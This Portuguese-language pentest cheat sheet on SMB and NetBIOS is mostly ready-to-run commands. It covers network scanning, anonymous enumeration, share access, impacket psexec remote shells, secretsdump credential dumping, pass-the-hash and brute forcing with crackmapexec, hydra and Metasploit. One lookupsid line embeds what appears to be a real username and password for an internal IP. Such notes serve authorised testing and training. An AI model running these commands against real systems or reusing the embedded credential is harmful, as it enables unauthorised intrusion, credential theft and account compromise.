# 🖧 SMB / NetBios

## 🔎 Buscando em uma rede aonde temos o 445 (smb) aberto 
```bash
nmap --open -v -sS -p 445 -Pn 10.10.10.0/24 -oG smb.txt
cat smb.txt | grep "Up" | cut -d " " -f 2 > targets.txt
```

## 🔎 scripts do nmap para enum
```bash
ls /usr/share/nmap/scripts/smb*
nmap -v --script=smb-os-discovery 10.10.10.10
```


## 🔎 Escaneando a rede para protocolos NetBios 
```bash
nbtscan -r 10.10.10.0/24
```

## 🔎 Ferramenta para automatizar coleta de informações SMB
```bash
crackmapexec smb targets.txt

rpcclient -U "" -N 10.10.10.10   (-U "" é anônimo - Se conectar vai abrir um terminal onde podemos enumerar)

enum4linux -a 10.10.10.10
   -U lista de users
   -S mostrar os compartilhamentos
   -a todas as opções de enum
```

## 🔎 SMBMAP 
```bash
smbmap -H 10.10.10.10
```

🔎 Próximos passos recomendados:
✅ Impacket-lookupsid para tentar enumeração de usuários
Esse script é muito bom para descobrir outros usuários do sistema com base nos RIDs padrão.
```bash
python3 /usr/share/doc/python3-impacket/examples/lookupsid.py suporte:'7A766BlBV8h8e7lU'@172.23.1.21
```

## 🔎 smbclient - interagindo
```bash
smbclient -L \\10.10.10.10 -N -W workgroup
smbclient //10.10.10.10/pasta_compartilhada
smbclient //10.10.10.10/C$ -U user%senha -W workgroup
```

## ⚡ Obtendo Shell Remoto 
```bash
python3 /usr/share/doc/python3-impacket/examples/psexec.py workgroup/user:'senha'@10.10.10.10
impacket-secretsdump workgroup/user:'senha'@10.10.10.10
```

## 🔑 Obtendo Shell com Hash NTLM (Sem Senha em Texto Claro) 
```bash
python3 /usr/share/doc/python3-impacket/examples/psexec.py user@10.10.10.10 -hashes arq_hash
```

## ⚙️ CrackMapExec: Habilitando RDP
O crackmapexec -L lista funções disponíveis, incluindo a opção de habilitar o RDP (Verifique se a porta 3389 está disponível).

## Brute Force
```bash
auxiliary(scanner/smb/smb_login)
crackmapexec smb 10.10.10.0/24 -u users.txt -p senhas.txt
hydra -l administrator -p senha123 smb://10.10.10.10

```
